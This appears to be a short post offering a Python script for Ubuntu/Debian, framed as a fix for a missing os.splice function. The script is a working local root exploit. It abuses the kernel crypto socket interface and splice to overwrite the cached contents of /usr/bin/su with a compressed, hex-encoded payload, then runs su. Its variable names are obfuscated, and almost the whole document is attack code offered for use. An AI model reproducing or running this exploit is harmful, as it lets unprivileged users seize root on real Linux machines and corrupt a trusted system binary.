#CopyFlag - Solved problems with "os.slice" (runs on Ubuntu/Debian)

#!/usr/bin/env python3
import os as g, zlib, socket as s, ctypes, ctypes.util

# --- fix: os.splice via ctypes ---
_libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
_libc.splice.restype = ctypes.c_ssize_t
_libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
    ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
    ctypes.c_size_t, ctypes.c_uint,
]

def splice(src, dst, count, offset_src=None, offset_dst=None):
    off_s = ctypes.c_int64(offset_src) if offset_src is not None else None
    off_d = ctypes.c_int64(offset_dst) if offset_dst is not None else None
    ret = _libc.splice(
        src, ctypes.byref(off_s) if off_s is not None else None,
        dst, ctypes.byref(off_d) if off_d is not None else None,
        count, 0,
    )
    if ret < 0:
        raise OSError(ctypes.get_errno(), g.strerror(ctypes.get_errno()))
    return ret
# ----------------------------------

def d(x): return bytes.fromhex(x)

def c(f, t, c):
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg(
        [b"A" * 4 + c],
        [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)],
        32768,
    )
    r, w = g.pipe()
    splice(f, w, o, offset_src=0)   # ← usa nuestra implementación
    splice(r, u.fileno(), o)
    try:
        u.recv(8 + t)
    except:
        0

f = g.open("/usr/bin/su", 0)
i = 0
e = zlib.decompress(d(
    "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
))
while i < len(e):
    c(f, i, e[i:i + 4])
    i += 4
g.system("su")
